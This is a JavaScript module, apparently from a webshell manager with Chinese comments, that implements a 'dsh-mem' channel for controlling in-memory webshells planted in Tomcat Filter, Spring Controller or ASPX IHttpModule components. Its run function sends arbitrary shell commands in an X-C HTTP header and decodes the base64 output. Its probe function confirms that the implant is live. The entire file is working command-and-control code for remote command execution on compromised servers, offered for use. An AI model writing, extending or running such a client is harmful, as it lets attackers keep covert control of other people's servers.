// 内存马通道（dsh-mem，X-C 头触发协议）：
//   触发：任意存活路径 + 请求头 X-C=<命令>（GET，Filter/Controller/Module 型全兼容）
//   回显：base64(stdout)[|base64(stderr)] —— 段间 "|" 分隔；stderr 段在部分形态为原文
//   （纯 b64 字母表校验后再解码，非 b64 字母表按原文处理）
// 可连接对象：Tomcat Filter 型 / Spring Controller 型 / ASPX IHttpModule 型内存马。

import { httpRequest, unb64 } from "./http-client.js";

const B64_ALPHABET = /^[A-Za-z0-9+/=\r\n]+$/;

/** 回显段解码：纯 b64 字母表 → 解码；否则按原文（Module 型 stderr 段为原文）。 */
export function decodeSeg(seg) {
	const s = String(seg ?? "").trim();
	if (!s) return "";
	if (!B64_ALPHABET.test(s)) return s; // 非 b64 字母表 → 原文段
	return unb64(s).toString("utf8");
}

/** 执行命令 → stdout（+stderr 追加）。X-C 头承载命令——仅限 latin-1（中文等非 ASCII 命令字面量不被 HTTP 头允许）。 */
export async function run(conn, command) {
	const cmd = String(command ?? "");
	if (/[^\x00-\xFF]/.test(cmd)) throw new Error("X-C 头通道仅支持 latin-1 命令字符——中文等非 ASCII 字面量请改英文命令（输出侧任意编码不受限）");
	const res = await httpRequest({
		url: conn.url,
		method: "GET",
		headers: { "X-C": cmd, ...(conn.headers ?? {}) },
		body: null,
		timeoutMs: conn.timeoutMs
	});
	if (res.status !== 200) throw new Error(`内存马拒绝（HTTP ${res.status}——未注入或触发头不符）`);
	const text = res.bodyBuffer.toString("utf8").trim();
	if (!text) throw new Error("内存马无回显——未注入或触发头不符");
	const bar = text.indexOf("|");
	let out;
	if (bar === -1) {
		out = decodeSeg(text);
	} else {
		out = decodeSeg(text.slice(0, bar)) + decodeSeg(text.slice(bar + 1));
	}
	return out;
}

const probeToken = () => "WSMM" + Math.random().toString(36).slice(2, 10).toUpperCase();

export async function probe(conn) {
	try {
		const token = probeToken();
		const out = await run({ ...conn, timeoutMs: Math.min(conn.timeoutMs || 8000, 8000) }, "echo " + token);
		return out.includes(token) ? { tokenOutput: out } : null;
	} catch {
		return null;
	}
}

export const dshMemCodec = {
	id: "dsh-mem",
	label: "内存马通道（X-C 头触发）",
	langs: ["jsp", "aspx"],
	caps: { cmd: true, code: false, b64rw: false },
	run
};
